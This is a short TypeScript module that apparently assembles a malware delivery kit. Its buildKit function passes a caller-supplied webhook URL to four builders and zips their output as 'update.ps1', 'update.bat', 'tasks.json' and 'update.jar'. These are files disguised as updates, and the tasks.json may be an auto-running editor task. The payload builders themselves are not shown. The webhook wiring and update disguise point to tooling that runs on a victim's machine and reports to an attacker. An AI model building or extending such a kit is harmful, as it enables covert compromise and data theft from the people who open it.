import { buildPs1 } from "./ps1.js";
import { buildBat } from "./bat.js";
import { buildTasksJson } from "./tasks.js";
import { buildJar } from "./jar.js";
import { createRequire } from "module";
const require = createRequire(import.meta.url);

export async function buildKit(webhook: string): Promise<Buffer> {
  const JSZip = require("jszip");
  const zip = new JSZip();

  const [ps1, bat, tasks, jar] = await Promise.all([
    Promise.resolve(buildPs1(webhook)),
    Promise.resolve(buildBat(webhook)),
    Promise.resolve(buildTasksJson(webhook)),
    buildJar(webhook),
  ]);

  zip.file("update.ps1", ps1);
  zip.file("update.bat", bat);
  zip.file("tasks.json", tasks);
  zip.file("update.jar", jar, { binary: true });

  return await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" });
}
